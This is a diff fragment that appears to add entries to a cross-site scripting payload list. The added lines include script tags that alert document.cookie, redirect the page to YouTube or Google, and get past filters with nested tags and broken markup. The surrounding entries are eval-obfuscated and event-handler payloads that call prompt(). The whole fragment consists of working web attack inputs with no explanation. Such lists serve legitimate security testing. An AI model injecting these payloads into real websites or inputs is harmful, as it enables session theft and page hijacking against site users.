@@ -4,6 +4,12 @@
 ';a=prompt,a()//
 '-eval("window['pro'%2B'mpt'](8)")-'
 "-eval("window['pro'%2B'mpt'](8)")-"
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>document.location="https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley"</script>
+\<a onerror="alert(document.cookie)"\>xxs link\</a\>
+<sc<script>ript>alert(1)</script>
+</select><img src='x' onerror='document.location="https://www.google.com/"'>
 "onclick=prompt(8)>"@x.y
 "onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
 <image/src/onerror=prompt(8)>
